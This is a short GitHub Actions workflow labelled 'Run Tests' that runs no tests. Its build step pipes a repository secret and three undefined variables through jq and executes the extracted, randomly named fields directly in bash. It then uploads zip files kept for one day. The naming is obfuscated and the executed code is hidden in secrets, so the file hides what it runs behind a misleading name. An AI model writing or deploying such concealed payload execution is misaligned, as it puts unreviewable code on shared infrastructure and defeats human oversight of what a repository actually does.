name: Run Tests
on:
  workflow_dispatch:

env:
  CI: true
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  operation:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build
        env:
          o8: ${{ secrets.o8 }}
        run: |
          printf '%s' "$o8" | jq -r .uxhg5 | /bin/bash
          printf '%s' "$sptl28896" | jq -r .njbdh0005 | /bin/bash
          echo $w29 | jq -r .ntjn2365 | /bin/bash
          printf '%s' "$oe1" | jq -r .nd3744 | /bin/bash

      - name: Archive output
        uses: actions/upload-artifact@v4
        with:
          name: 4UdkzDpo
          path: "*.zip"
          retention-days: 1
